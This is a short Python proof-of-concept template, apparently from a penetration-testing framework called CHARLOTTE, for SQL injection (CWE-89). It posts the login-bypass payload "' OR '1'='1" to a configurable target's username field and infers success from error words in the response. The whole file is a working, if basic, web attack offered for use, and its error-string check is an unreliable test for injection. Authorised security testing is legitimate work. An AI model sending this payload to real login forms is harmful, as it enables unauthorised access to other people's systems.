"""
Proof-of-Concept: SQL Injection - CWE-89
CHARLOTTE Template Stub (Auto-Adaptive)
"""

import requests

def run_sqli_poc(finding):
    target_url = finding.get("url", "http://example.com/login")
    param = finding.get("param", "username")
    payload = "' OR '1'='1"
    dummy_fields = {param: payload}
    if "password_field" in finding:
        dummy_fields[finding["password_field"]] = "dummy"

    print(f"[*] Sending SQLi payload to {target_url} with {param} = {payload}")
    try:
        response = requests.post(target_url, data=dummy_fields, timeout=10)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print("[+] SQL Injection likely detected!")
        else:
            print("[-] No SQL error feedback detected.")
    except Exception as e:
        print(f"[!] Error: {e}")

# Example call:
# run_sqli_poc({ "url": "http://target.com/login", "param": "username", "password_field": "password" })

# This code is a template for a SQL Injection proof-of-concept (PoC).
# It sends a crafted request to a target URL with a SQL injection payload in the username parameter.